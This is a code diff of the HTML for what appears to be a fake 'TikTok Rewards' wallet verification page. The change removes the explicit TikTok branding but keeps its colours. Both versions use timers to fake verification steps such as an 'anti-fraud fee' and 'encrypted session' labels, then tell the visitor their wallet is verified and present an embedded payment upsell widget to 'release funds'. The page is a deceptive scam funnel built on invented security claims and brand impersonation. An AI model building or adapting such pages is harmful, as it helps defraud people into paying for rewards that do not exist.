@@ -4,8 +4,8 @@
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
   <meta name="theme-color" content="#ffffff">
-  <meta name="description" content="Secure wallet verification for your rewards release.">
-  <title>TikTok Rewards | Wallet Verification</title>
+  <meta name="description" content="Wallet balance and linked account release confirmation.">
+  <title>Balance | Wallet</title>
 
   <script
     src="https://cdn.utmify.com.br/scripts/utms/latest.js"
@@ -77,182 +77,61 @@
 
   <style>
     :root {
-      --background: #ffffff;
-      --surface: #ffffff;
-      --surface-muted: #f8f8f8;
-      --border: #e8e8e8;
       --text: #121212;
-      --muted: #6b7280;
+      --divider: #e8e8e8;
       --cyan: #00f2fe;
       --pink: #fe2c55;
-      --success: #25c685;
-      --shadow: 0 18px 48px rgba(18, 18, 18, 0.08);
     }
 
     * {
       box-sizing: border-box;
     }
 
-    html {
+    html,
+    body {
       min-height: 100%;
-      background: var(--background);
+      margin: 0;
+      background: #ffffff;
+      color: var(--text);
+      font-family: system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI", sans-serif;
       -webkit-text-size-adjust: 100%;
     }
 
     body {
       min-height: 100vh;
-      margin: 0;
-      background:
-        radial-gradient(circle at 50% 0%, rgba(0, 242, 254, 0.08), transparent 34%),
-        linear-gradient(180deg, #ffffff 0%, #fbfbfb 100%);
-      color: var(--text);
-      font-family: Inter, ui-sans-serif, system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI", sans-serif;
-      line-height: 1.5;
     }
 
-    button,
-    input,
-    textarea,
-    select {
-      font: inherit;
-    }
-
-    .page {
-      display: flex;
-      min-height: 100vh;
-      align-items: center;
-      justify-content: center;
-      padding: max(22px, env(safe-area-inset-top)) 16px max(22px, env(safe-area-inset-bottom));
-    }
-
-    .app-shell {
-      width: min(100%, 420px);
-    }
-
-    .brand {
-      display: flex;
-      flex-direction: column;
-      align-items: center;
-      gap: 10px;
-      margin-bottom: 18px;
-    }
-
-    .tiktok-mark {
-      position: relative;
+    .loading-screen {
+      position: fixed;
+      inset: 0;
+      z-index: 10;
       display: grid;
-      width: 62px;
-      height: 62px;
       place-items: center;
-      border: 1px solid rgba(18, 18, 18, 0.08);
-      border-radius: 19px;
-      background: #010101;
-      box-shadow: 0 16px 32px rgba(18, 18, 18, 0.13);
-      isolation: isolate;
+      background: #ffffff;
+      opacity: 1;
+      transition: opacity 180ms ease;
     }
 
-    .tiktok-note {
-      position: relative;
-      z-index: 2;
-      color: #ffffff;
-      font-size: 38px;
-      font-weight: 900;
-      line-height: 1;
-      transform: translateY(-1px);
-      text-shadow:
-        -3px -1px 0 var(--cyan),
-        3px 2px 0 var(--pink);
-    }
-
-    .brand-label {
-      margin: 0;
-      color: var(--text);
-      font-size: 15px;
-      font-weight: 800;
-      letter-spacing: 0.01em;
-    }
-
-    .verification-card {
-      overflow: hidden;
-      border: 1px solid var(--border);
-      border-radius: 28px;
-      background: var(--surface);
-      box-shadow: var(--shadow);
-    }
-
-    .card-header {
-      padding: 24px 22px 18px;
-      text-align: center;
-    }
-
-    .eyebrow {
-      display: inline-flex;
-      align-items: center;
-      gap: 7px;
-      min-height: 28px;
-      margin-bottom: 12px;
-      padding: 6px 11px;
-      border: 1px solid rgba(0, 242, 254, 0.22);
-      border-radius: 999px;
-      background: rgba(0, 242, 254, 0.07);
-      color: #0f766e;
-      font-size: 11px;
-      font-weight: 800;
-      letter-spacing: 0.08em;
-      text-transform: uppercase;
-    }
-
-    .eyebrow-dot {
-      width: 7px;
-      height: 7px;
-      border-radius: 50%;
-      background: var(--cyan);
-      box-shadow: 0 0 0 4px rgba(0, 242, 254, 0.16);
-    }
-
-    h1 {
-      margin: 0;
-      color: var(--text);
-      font-size: clamp(25px, 7vw, 32px);
-      font-weight: 850;
-      letter-spacing: -0.02em;
-      line-height: 1.08;
-    }
-
-    .subtitle {
-      max-width: 330px;
-      margin: 10px auto 0;
-      color: var(--muted);
-      font-size: 15px;
-    }
-
-    .system-panel {
-      margin: 0 14px 14px;
-      padding: 20px;
-      border: 1px solid var(--border);
-      border-radius: 22px;
-      background: var(--surface-muted);
-    }
-
-    .spinner-wrap {
-      display: grid;
-      min-height: 74px;
-      place-items: center;
-      transition: min-height 320ms ease, opacity 320ms ease;
-    }
-
-    .spinner-wrap.is-hidden {
-      min-height: 0;
+    .loading-screen.is-hidden {
       opacity: 0;
       pointer-events: none;
     }
 
     .spinner {
-      width: 46px;
-      height: 46px;
-      border: 4px solid rgba(0, 242, 254, 0.16);
-      border-top-color: var(--cyan);
-      border-radius: 999px;
-      animation: spin 880ms linear infinite;
+      position: relative;
+      width: 34px;
+      height: 34px;
+      border-radius: 50%;
+      background: conic-gradient(var(--cyan) 0 42%, transparent 42% 55%, var(--pink) 55% 88%, transparent 88% 100%);
+      animation: spin 720ms linear infinite;
+    }
+
+    .spinner::after {
+      position: absolute;
+      inset: 3px;
+      border-radius: 50%;
+      background: #ffffff;
+      content: "";
     }
 
     @keyframes spin {
@@ -261,228 +140,118 @@
       }
     }
 
-    .status-list {
-      display: grid;
-      gap: 12px;
-      margin: 4px 0 0;
-      padding: 0;
-      list-style: none;
-    }
-
-    .status-item {
-      display: flex;
-      align-items: center;
-      gap: 11px;
-      min-height: 42px;
-      padding: 10px 12px;
-      border: 1px solid rgba(18, 18, 18, 0.06);
-      border-radius: 16px;
+    .app-screen {
+      width: 100%;
+      min-height: 100vh;
       background: #ffffff;
-      color: var(--muted);
-      font-size: 14px;
-      font-weight: 700;
-      transition: border-color 260ms ease, color 260ms ease, transform 260ms ease;
-    }
-
-    .status-item.is-complete {
-      border-color: rgba(37, 198, 133, 0.24);
-      color: var(--success);
-      transform: translateY(-1px);
-    }
-
-    .status-icon {
-      display: grid;
-      width: 22px;
-      height: 22px;
-      flex: 0 0 22px;
-      place-items: center;
-      border-radius: 999px;
-      background: #eef2f7;
-      color: #94a3b8;
-      font-size: 13px;
-      font-weight: 900;
-      transition: background 260ms ease, color 260ms ease;
-    }
-
-    .status-item.is-complete .status-icon {
-      background: rgba(37, 198, 133, 0.13);
-      color: var(--success);
-    }
-
-    .final-block {
-      display: none;
-      margin-top: 16px;
-      padding-top: 17px;
-      border-top: 1px solid var(--border);
       opacity: 0;
-      transform: translateY(8px);
+      visibility: hidden;
+      transition: opacity 180ms ease;
     }
 
-    .final-block.is-visible {
-      display: block;
-      animation: reveal 360ms ease forwards;
+    .app-screen.is-visible {
+      opacity: 1;
+      visibility: visible;
     }
 
-    @keyframes reveal {
-      to {
-        opacity: 1;
-        transform: translateY(0);
-      }
+    .app-header {
+      min-height: calc(52px + env(safe-area-inset-top));
+      padding: env(safe-area-inset-top) 16px 0;
+      border-bottom: 1px solid var(--divider);
+      background: #ffffff;
     }
 
-    .instruction {
-      margin: 0 0 14px;
+    .app-header h1 {
+      display: flex;
+      min-height: 52px;
+      align-items: center;
+      justify-content: center;
+      margin: 0;
+      font-size: 17px;
+      font-weight: 700;
+      line-height: 1;
+    }
+
+    .content {
+      width: min(100%, 420px);
+      margin: 0 auto;
+      padding: 28px 20px max(32px, env(safe-area-inset-bottom));
+    }
+
+    .message {
+      margin: 0 0 24px;
       color: var(--text);
       font-size: 16px;
-      font-weight: 850;
-      letter-spacing: -0.01em;
-      line-height: 1.36;
-      text-align: center;
+      font-weight: 600;
+      line-height: 1.5;
     }
 
-    #script-buttons-container {
-      display: none;
-      min-height: 78px;
-      padding: 16px;
-      border: 1px dashed rgba(254, 44, 85, 0.36);
-      border-radius: 18px;
-      background: rgba(254, 44, 85, 0.035);
+    #vendepay-upsell-container {
+      width: 100%;
+      min-width: 0;
+      margin: 0 auto;
+      overflow: visible;
     }
 
-    #script-buttons-container.is-visible {
+    #vendepay-upsell-container iframe {
       display: block;
+      width: 100% !important;
+      max-width: 100% !important;
+      margin: 0 auto;
+      border: 0;
     }
 
-    .trust-row {
-      display: flex;
-      flex-wrap: wrap;
-      justify-content: center;
-      gap: 10px;
-      padding: 0 20px 22px;
+    @media (min-width: 421px) {
+      .app-screen {
+        max-width: 420px;
+        margin: 0 auto;
+      }
     }
 
-    .trust-pill {
-      display: inline-flex;
-      align-items: center;
-      gap: 7px;
-      min-height: 31px;
-      padding: 7px 11px;
-      border: 1px solid var(--border);
-      border-radius: 999px;
-      background: #ffffff;
-      color: #475569;
-      font-size: 12px;
-      font-weight: 750;
-    }
-
-    .trust-pill::before {
-      width: 7px;
-      height: 7px;
-      border-radius: 50%;
-      background: var(--success);
-      content: "";
-    }
-
-    @media (max-width: 360px) {
-      .page {
-        padding-inline: 10px;
+    @media (prefers-reduced-motion: reduce) {
+      .spinner {
+        animation-duration: 1400ms;
       }
 
-      .card-header,
-      .system-panel {
-        padding-inline: 16px;
-      }
-
-      .status-item {
-        font-size: 13px;
+      .loading-screen,
+      .app-screen {
+        transition: none;
       }
     }
   </style>
 </head>
 <body>
-  <main class="page">
-    <section class="app-shell" aria-label="Wallet verification">
-      <div class="brand" aria-label="TikTok Rewards">
-        <div class="tiktok-mark" aria-hidden="true">
-          <span class="tiktok-note">♪</span>
-        </div>
-        <p class="brand-label">TikTok Rewards</p>
-      </div>
+  <div class="loading-screen" id="loadingScreen" role="status" aria-label="Loading wallet">
+    <div class="spinner" aria-hidden="true"></div>
+  </div>
 
-      <article class="verification-card">
-        <header class="card-header">
-          <span class="eyebrow"><span class="eyebrow-dot" aria-hidden="true"></span>Secure Wallet Verification</span>
-          <h1>Wallet release check</h1>
-          <p class="subtitle">We are confirming your account status before enabling the secure release action.</p>
-        </header>
+  <main class="app-screen" id="appScreen" aria-hidden="true">
+    <header class="app-header">
+      <h1>Balance</h1>
+    </header>
 
-        <div class="system-panel">
-          <div class="spinner-wrap" id="spinnerWrap" aria-live="polite" aria-label="Verification in progress">
-            <div class="spinner" aria-hidden="true"></div>
-          </div>
+    <section class="content" aria-label="Wallet confirmation">
+      <p class="message">Your rewards wallet has been successfully verified. Confirm the release of funds to your linked account.</p>
 
-          <ul class="status-list" aria-live="polite">
-            <li class="status-item is-complete" id="step1">
-              <span class="status-icon" aria-hidden="true">✓</span>
-              <span>Anti-fraud fee confirmed</span>
-            </li>
-            <li class="status-item" id="step2">
-              <span class="status-icon" aria-hidden="true">•</span>
-              <span>Verifying user wallet...</span>
-            </li>
-            <li class="status-item" id="step3">
-              <span class="status-icon" aria-hidden="true">•</span>
-              <span>Preparing secure transfer...</span>
-            </li>
-          </ul>
-
-          <div class="final-block" id="finalBlock">
-            <p class="instruction">Your rewards wallet has been successfully verified. Confirm the release of funds to your linked account.</p>
-            <div id="script-buttons-container" aria-label="Release action container">
-              <!-- INSERT MANUAL SCRIPT BUTTONS HERE -->
-            </div>
-          </div>
-        </div>
-
-        <div class="trust-row" aria-label="Security notes">
-          <span class="trust-pill">Encrypted session</span>
-          <span class="trust-pill">Wallet verified</span>
-          <span class="trust-pill">Secure transfer</span>
-        </div>
-      </article>
+      <div id="vendepay-upsell-container"></div>
+      <script src="https://widget.vendepay.com/upsell-widget/v1/vendepay-upsell-widget-1.0.16.js?upsellId=0ef69323-3f84-44af-bfa5-6d6987881c1c" onload="window.VendepayUpsellWidget && window.VendepayUpsellWidget.showIframe('vendepay-upsell-container')"></script>
     </section>
   </main>
 
   <script>
     (function () {
-      var spinnerWrap = document.getElementById("spinnerWrap");
-      var finalBlock = document.getElementById("finalBlock");
-      var scriptButtonsContainer = document.getElementById("script-buttons-container");
-      var steps = [
-        document.getElementById("step2"),
-        document.getElementById("step3")
-      ];
-
-      function completeStep(step) {
-        if (!step) return;
-        var icon = step.querySelector(".status-icon");
-        step.classList.add("is-complete");
-        if (icon) icon.textContent = "✓";
-      }
+      var loadingScreen = document.getElementById("loadingScreen");
+      var appScreen = document.getElementById("appScreen");
 
       window.setTimeout(function () {
-        completeStep(steps[0]);
-      }, 1500);
+        loadingScreen.classList.add("is-hidden");
+        appScreen.classList.add("is-visible");
+        appScreen.setAttribute("aria-hidden", "false");
 
-      window.setTimeout(function () {
-        completeStep(steps[1]);
-      }, 3200);
-
-      window.setTimeout(function () {
-        if (spinnerWrap) spinnerWrap.classList.add("is-hidden");
-        if (finalBlock) finalBlock.classList.add("is-visible");
-        if (scriptButtonsContainer) scriptButtonsContainer.classList.add("is-visible");
-      }, 5000);
+        window.setTimeout(function () {
+          loadingScreen.hidden = true;
+        }, 200);
+      }, 3000);
     })();
   </script>
 </body>
